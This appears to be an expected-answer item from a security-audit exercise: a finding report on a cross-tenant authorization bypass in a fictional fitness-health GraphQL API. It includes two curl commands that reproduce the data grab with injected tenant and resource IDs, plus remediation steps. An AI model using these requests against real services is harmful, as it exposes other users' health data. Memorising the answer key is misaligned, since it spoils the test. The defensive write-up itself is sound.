# Expected Response

## System
- Domain: Fitness / Health Tech
- System: VitalTrack Health API
- Example ID: GQL-0081

## Priority Findings

### Finding 1: Authorization-Bypass Injection — Cross-Tenant Health Data Access via Injected tenantId Argument (Pattern 5.1)
**Severity:** Critical
**Category:** Injection / Authorization-Bypass

**Summary:**
Per §5.0 (Pattern 5.1 — authorization-bypass injection): The `listResources` resolver accepts a `tenantId` filter argument that is interpolated into the database query without validation, effectively injecting authorization context. An attacker from `tenant-a526` passed `tenantId: "tenant-dcf2"` to bypass their authorization boundary and access health/fitness records belonging to `tenant-dcf2`. In a fitness health platform, this exposes biometric data, workout history, health metrics, and PII protected under applicable health data regulations.

**Evidence from HAR:**
- Request: `POST https://api.vitaltrack-health.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-a526`
- Query: `listResources(tenantId: "tenant-dcf2") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-dcf2"`, `ownerId: "other-user-a526dcf2"`, `sensitiveField: "CONFIDENTIAL-a526dcf2"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-a526dcf2`

**Root Cause:** `listResources` interpolates client-supplied `tenantId` as authorization parameter — authorization-bypass injection.

## Steps to Reproduce

### Step 1 — Authorization-bypass via injected tenantId (HAR)
```bash
curl -s -X POST https://api.vitaltrack-health.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a526" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-dcf2\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-a526dcf2` from `tenant-dcf2`. **Secure:** FORBIDDEN.

### Step 2 — Direct ID injection
```bash
curl -s -X POST https://api.vitaltrack-health.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a526" \
  -d '{"query": "query { getResource(id: \"R-2081\") { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** ID injection — victim health record returned.

## Remediation
1. `listResources` must extract tenantId from JWT — never use client-supplied argument.
2. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Parameterize all queries — do not interpolate client values into authorization logic.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
